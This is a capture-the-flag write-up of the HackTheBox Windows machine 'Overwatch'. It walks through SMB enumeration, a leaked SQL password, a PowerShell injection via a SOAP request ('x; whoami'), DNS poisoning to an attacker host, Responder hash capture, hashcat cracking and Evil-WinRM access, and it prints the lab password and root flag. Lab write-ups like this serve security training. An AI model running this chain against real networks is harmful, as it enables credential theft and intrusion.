# Overwatch — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Medium |
| Active Directory | Yes |
| IP | 10.129.42.218 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/overwatch) |

**Techniques:** Anonymous SMB -> .NET config leak -> WCF/SOAP PowerShell injection -> DNS poisoning (dnstool) -> Responder -> credential capture -> Evil-WinRM

---

## Summary

Windows AD machine with a creative multi-stage chain. Anonymous SMB exposes a .NET monitoring app whose config leaks SQL credentials. Decompiling reveals a WCF service on port 8000 with PowerShell command injection in `KillProcess`. MSSQL linked server enumeration triggers outbound auth — DNS poisoning intercepts it, Responder captures sqlmgmt credentials. Evil-WinRM grants shell, WCF injection delivers root.

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.42.218 -oN nmap_full.txt
```

```
PORT     STATE SERVICE
53/tcp   open  dns
88/tcp   open  kerberos-sec    Domain: overwatch.htb
445/tcp  open  microsoft-ds
5985/tcp open  http            WinRM
6520/tcp open  ms-sql-s        SQL Server 2022  <- unusual port
8000/tcp open  http            WCF Service      <- interesting
```

```bash
echo "10.129.42.218  overwatch.htb S200401.overwatch.htb" | sudo tee -a /etc/hosts
```

---

## 02 — SMB Enumeration

```bash
crackmapexec smb 10.129.42.218 -u 'guest' -p '' --rid-brute
# 1104: OVERWATCH\sqlsvc
# 1105: OVERWATCH\sqlmgmt

smbclient -L //10.129.42.218 -N
# Monitoring  <- non-default share

smbclient //10.129.42.218/Monitoring -N
smb: \> mget *
# overwatch.exe, overwatch.exe.config, overwatch.pdb
```

Config file leaks SQL credentials:

```xml
<connectionStrings>
  <add name="OverwatchDB"
       connectionString="Server=localhost;Database=SecurityLogs;
       User Id=sqlsvc;Password=TI0LKcfHzZw1Vv"/>
</connectionStrings>
```

WCF endpoint: `http://overwatch.htb:8000/MonitorService`

---

## 03 — WCF SOAP Injection

Decompile `overwatch.exe` with ilspycmd — `KillProcess` passes input directly to PowerShell:

```csharp
public string KillProcess(string processName) {
    var ps = PowerShell.Create();
    ps.AddScript($"Stop-Process -Name {processName} -Force");
    ps.Invoke();
}
```

SOAP request with injected command:

```xml
POST http://overwatch.htb:8000/MonitorService HTTP/1.1
Content-Type: text/xml
SOAPAction: "IMonitoringService/KillProcess"

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>x; whoami</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
```

Injection confirmed.

---

## 04 — MSSQL Linked Server + DNS Poisoning

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.42.218 -port 6520

SQL> SELECT name FROM sys.servers;
# SQL07  <- linked server

# Poison DNS to redirect SQL07 to attacker
python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --record SQL07 --action add --data <ATTACKER_IP> 10.129.42.218

# Start Responder
sudo responder -I tun0

# Trigger linked server query -> SQL07 authenticates -> Responder captures
SQL> EXEC ('SELECT 1') AT SQL07;
# [MSSQL] NTLMv2 Hash: sqlmgmt::OVERWATCH:...
```

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# sqlmgmt : <password>
```

---

## 05 — Shell + Flags

```bash
evil-winrm -i 10.129.42.218 -u sqlmgmt -p '<password>'
type C:\Users\sqlmgmt\Desktop\user.txt    # user flag

# Root via WCF SOAP injection — inject command to read Administrator desktop
# 6a41ef0210d0e968c37a885288ecfcb5
```

---

## Key takeaways

- Non-standard SMB shares always contain the interesting content
- WCF config files (`*.exe.config`) routinely contain connection strings in plaintext
- PowerShell string interpolation without sanitization = command injection via SOAP
- MSSQL linked servers trigger outbound auth — combine with Responder + DNS poisoning
- `dnstool.py` DNS poisoning is clean and leaves minimal footprint
